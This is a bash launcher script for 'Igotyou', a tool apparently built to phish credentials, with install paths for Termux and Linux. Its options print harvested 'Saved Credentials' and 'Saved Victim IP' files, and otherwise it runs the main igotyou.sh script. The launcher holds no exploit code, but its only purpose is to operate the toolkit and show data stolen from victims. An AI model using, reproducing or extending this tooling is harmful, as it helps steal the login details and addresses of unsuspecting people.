#!/bin/bash

# https://github.com/AnonyHackz/Igotyou

if [[ $(uname -o) == *'Android'* ]];then
	IGOTYOU_ROOT="/data/data/com.termux/files/usr/opt/Igotyou"
else
	export IGOTYOU_ROOT="/opt/Igotyou"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Igotyou type \`igotyou\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $IGOTYOU_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $IGOTYOU_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $IGOTYOU_ROOT
	bash ./igotyou.sh
fi
